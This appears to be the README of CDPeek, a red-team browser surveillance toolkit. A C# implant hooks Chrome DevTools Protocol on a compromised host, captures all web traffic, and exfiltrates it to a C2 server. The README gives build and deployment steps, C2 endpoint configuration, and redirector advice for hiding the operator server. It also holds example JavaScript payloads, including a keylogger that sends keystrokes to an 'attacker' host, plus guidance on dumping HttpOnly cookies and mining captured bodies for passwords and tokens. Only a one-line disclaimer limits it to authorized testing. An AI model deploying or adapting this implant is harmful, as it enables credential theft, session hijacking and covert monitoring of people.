# CDPeek

Post-exploitation browser traffic interception via Chrome DevTools Protocol.

---

## Overview

CDPeek is a browser surveillance toolkit designed for red team operations. It leverages Chrome DevTools Protocol (CDP) to intercept HTTP/HTTPS traffic from Chromium-based browsers in real-time, enabling credential harvesting, session token capture, and victim activity monitoring.

Pairs with [CDP-Enabler](https://github.com/deathflamingo/CDP-Enabler) for runtime CDP activation without browser restart—no need to wait for the target to relaunch their browser.

![[images/Capture_Showcase.png]]

![[images/Sending_JS.png]]

![[images/JS_executed.png]]

### Components

| Component | Purpose |
|-----------|---------|
| **TrafficRecorder** | Lightweight C# implant that hooks into CDP and exfiltrates captured traffic |
| **TrafficViewer** | Operator interface for real-time traffic analysis, cookie extraction, and JS execution |

### Attack Flow

```
[Compromised Host]
        │
        ▼
[CDP-Enabler] ──► DLL injection into browser process
        │         Enables CDP on localhost:8181
        ▼
[TrafficRecorder] ──► Connects to browser-level CDP
        │             Auto-attaches to all tabs
        │             Captures all HTTP/HTTPS traffic
        │             Survives page navigation
        ▼
[Exfil Channel] ──► HTTP POST to operator server
        │
        ▼
[TrafficViewer] ──► Real-time analysis
                    Cookie extraction
                    Remote JS execution
                    Session hijacking prep
```

---

## Operational Use Cases

### Credential Harvesting
Capture login form submissions, API authentication requests, and OAuth token exchanges. All POST bodies are logged, including username/password pairs submitted to login endpoints.

### Cookie Extraction
Use the **Get Cookies** button to dump all browser cookies via `Network.getAllCookies`. Captures HttpOnly, Secure, and session cookies that aren't accessible via JavaScript—useful for session hijacking.

### Remote JavaScript Execution
Execute arbitrary JavaScript in any browser tab via `Runtime.evaluate`. Select a target page and inject keyloggers, form grabbers, or exfiltration scripts directly into the victim's browsing session.

### Activity Monitoring
Observe victim browsing patterns, internal application usage, and sensitive data access. Useful for identifying high-value targets and understanding internal workflows.

### Internal Application Discovery
Passively map internal web applications, APIs, and services as the victim browses. Captures full request/response pairs including internal hostnames and endpoints.

---

## Capabilities

### TrafficRecorder (Implant)

- **Browser-level CDP connection** - Single persistent WebSocket to browser, not individual tabs
- **Flattened sessions** - Auto-attaches to all pages via `Target.setAutoAttach`
- **Navigation-resilient** - Sessions survive page navigation, minimal request loss
- Full request capture: method, URL, headers, POST bodies
- Full response capture: status, headers, body content
- Multi-tab concurrent monitoring
- Self-traffic filtering (won't capture C2 comms to operator server)
- Automatic cleanup when tabs close
- Minimal footprint, runs as standalone executable
- Supports in-memory execution

### TrafficViewer (Operator Interface)

- Real-time traffic stream via WebSocket
- Request/response inspection with header and body parsing
- JSON auto-formatting for API traffic
- HTML rendering with CSS injection for page preview
- **Get Cookies** - Extract all browser cookies including HttpOnly
- **Execute JS** - Run arbitrary JavaScript in selected browser tabs
- Session save/load for persistent analysis

---

## Deployment

### Prerequisites

**Target Host:**
- Windows with .NET Framework 4.8+
- Chromium-based browser (Chrome, Edge, Brave, Opera, etc.)
- [CDP-Enabler](https://github.com/deathflamingo/CDP-Enabler) or browser launched with `--remote-debugging-port`

**Operator Infrastructure:**
- Node.js 14+ for TrafficViewer
- Network path from target to operator server (direct, redirector, or tunnel)

### Build

**TrafficRecorder:**
```bash
cd TrafficRecorder
dotnet build -c Release
```
Output: `TrafficRecorder/bin/Release/net48/TrafficRecorder.exe`

Single-file executable with embedded dependencies (Costura.Fody).

**TrafficViewer:**
```bash
cd TrafficViewer
npm install
```

### Execution

**1. Start operator server:**
```bash
cd TrafficViewer
npm start
# Listening on http://localhost:3000
```

**2. Enable CDP on target (choose one):**
- Deploy CDP-Enabler for runtime injection
- Or wait for browser restart with `--remote-debugging-port=8181`

**3. Execute implant on target:**
```bash
TrafficRecorder.exe
```

Traffic flows immediately to your operator interface.

---

## Configuration

### TrafficRecorder

Edit `Program.cs` before compilation:

```csharp
// Operator server endpoint - where captured traffic is sent
const string ServerEndpoint = "https://your-c2-domain.com/api/capture";

// Command polling endpoint
const string CommandsEndpoint = "https://your-c2-domain.com/api/commands";

// Command result endpoint
const string CommandResultEndpoint = "https://your-c2-domain.com/api/command-result";

// Local CDP endpoint on target
const string CdpEndpoint = "http://localhost:8181";

// Self-filter to avoid capturing C2 traffic (must match your domain)
const string ServerHost = "your-c2-domain.com";
```

### TrafficViewer

```javascript
// server.js
const PORT = process.env.PORT || 3000;
const SAVES_DIR = path.join(__dirname, 'saves');
```

---

## Proxy Setup

In real world use, TrafficViewer runs on `localhost:3000` and should be fronted by a reverse proxy that handles TLS termination.

### Recommended Architecture

```
[Target Host]
      │
      ▼ HTTPS (443)
[Reverse Proxy / CDN / Redirector]
      │   - TLS termination
      │   - Domain: your-c2-domain.com
      │   - Optional: Cloudflare, AWS CloudFront, etc.
      ▼ HTTP (internal)
[TrafficViewer on localhost:3000]
      │
      ▼
[Operator Browser] ──► Dashboard on localhost:3000 or via SSH tunnel
```

### Endpoint Exposure Summary

| Endpoint | Expose Externally? | Purpose |
|----------|-------------------|---------|
| `POST /api/capture` | Yes (via proxy) | Implant sends captured traffic |
| `GET /api/commands` | Yes (via proxy) | Implant polls for commands |
| `POST /api/command-result` | Yes (via proxy) | Implant returns command results |
| `GET /` | No | Operator dashboard |
| `GET /api/transactions` | No | Operator views traffic |
| `POST /api/save` | No | Operator saves sessions |
| `*` (all others) | No | Operator-only functionality |

---

## Operator Commands

### Get Cookies

Click **Get Cookies** in the TrafficViewer dashboard to execute `Network.getAllCookies` on the target browser. Returns all cookies including:
- HttpOnly cookies (not accessible via document.cookie)
- Secure cookies
- Session tokens
- Authentication cookies

Output displayed in a modal with full cookie details (name, value, domain, path, expiry, flags).

### Execute JavaScript

Click **Execute JS** to open the JavaScript execution panel:

1. **Select Target Page** - Dropdown lists all open browser tabs with their URLs
2. **Enter JavaScript** - Code to execute in the page context
3. **Execute** - Runs via `Runtime.evaluate` and returns result

Example payloads:
```javascript
// Grab localStorage
JSON.stringify(localStorage)

// Capture form data
document.querySelector('form').outerHTML

// Inject keylogger
document.addEventListener('keydown', e => fetch('http://attacker/log?k='+e.key))

// Extract session token
document.cookie
```

---

## Architecture

### Browser-Level CDP Connection

CDPeek uses a single WebSocket connection to the browser's main CDP endpoint rather than connecting to individual page targets. This provides:

```
Browser WebSocket (ws://localhost:8181/devtools/browser/<id>)
    │
    ├── Target.setAutoAttach({ flatten: true })
    │   └── Automatically attaches to all page targets
    │
    ├── Session A (Tab 1) ──► Network events with sessionId
    ├── Session B (Tab 2) ──► Network events with sessionId
    └── Session C (Tab 3) ──► Network events with sessionId
```

**Benefits:**
- Single persistent connection survives individual page navigation
- `Target.targetInfoChanged` updates URL without disconnecting
- Only lose requests when a tab is actually closed
- Reduced connection overhead vs. per-tab connections

### Command Flow

```
[TrafficViewer Dashboard]
        │
        ▼ Socket.io
[TrafficViewer Server]
        │
        ▼ Command Queue (/api/commands)
[TrafficRecorder] ◄── Polls every 500ms
        │
        ▼ CDP Command (with sessionId)
[Browser]
        │
        ▼ Result
[TrafficRecorder]
        │
        ▼ POST /api/command-result
[TrafficViewer Server]
        │
        ▼ Socket.io
[Dashboard] ◄── Displays result
```

---

## Data Handling

### What Gets Captured

- Full HTTP request headers
- Request bodies (form data, JSON payloads, file uploads as base64)
- Full HTTP response headers
- Response bodies (HTML, JSON, etc.)
- Timing information

### Extracting Value

**Credentials:** Search POST bodies for common parameter names:
- `password`, `passwd`, `pass`, `pwd`
- `username`, `user`, `email`, `login`
- `token`, `api_key`, `apikey`

**Sessions:** Look for headers:
- `Authorization:` (Bearer tokens, Basic auth)
- `X-Auth-Token`, `X-API-Key` (custom auth)

**Cookies:** Use Get Cookies for:
- Session IDs
- Authentication tokens
- CSRF tokens

**Internal Recon:**
- `Host:` headers reveal internal naming conventions
- Response bodies expose internal application structure
- API endpoints map backend services

### Session Management

- **Save:** Export current capture to JSON for offline analysis
- **Load:** Resume analysis of previous captures
- **Clear:** Wipe current session from memory
- **Delete:** Remove saved files from disk

---

## API Reference

TrafficViewer exposes these endpoints:

| Method | Endpoint | Purpose |
|--------|----------|---------|
| POST | `/api/capture` | Receive traffic from implant |
| GET | `/api/transactions` | List all captured transactions |
| GET | `/api/transactions/:id` | Get specific transaction |
| DELETE | `/api/transactions` | Clear current session |
| POST | `/api/save` | Save session to disk |
| POST | `/api/load` | Load saved session |
| GET | `/api/saves` | List saved sessions |
| DELETE | `/api/saves/:filename` | Delete saved session |
| GET | `/api/commands` | Get pending command for implant |
| POST | `/api/command-result` | Receive command result from implant |

**Security Note:** Only `/api/capture`, `/api/commands`, and `/api/command-result` should be exposed to target networks. All other endpoints are for operator use only.

---

## Limitations

- **HTTP/HTTPS only:** WebSocket traffic not captured via CDP Network events
- **Binary content:** Large binary responses stored as base64 references, not full content
- **Performance:** Very high-traffic browsers may cause delays in body retrieval
- **Scope:** One browser instance per TrafficRecorder instance
- **Tab closure:** Requests in-flight when a tab closes may not capture full response

---

## File Structure

```
CDPeek/
├── TrafficRecorder/           # Implant
│   ├── Program.cs            # Browser-level CDP connection
│   ├── Models/
│   │   └── CapturedTransaction.cs
│   └── TrafficRecorder.csproj
│
└── TrafficViewer/            # Operator server
    ├── server.js            # Express + Socket.IO + command queue
    ├── public/
    │   ├── index.html       # Dashboard with Get Cookies/Execute JS
    │   ├── app.js           # Client-side logic
    │   └── styles.css
    ├── saves/               # Captured sessions
    └── package.json
```

---

## Related

- [CDP-Enabler](https://github.com/deathflamingo/CDP-Enabler) - Runtime CDP activation via DLL injection

---

## Legal

This tool is intended for authorized security testing and red team operations only. Unauthorized interception of network traffic is illegal. Obtain proper written authorization before deployment.

---
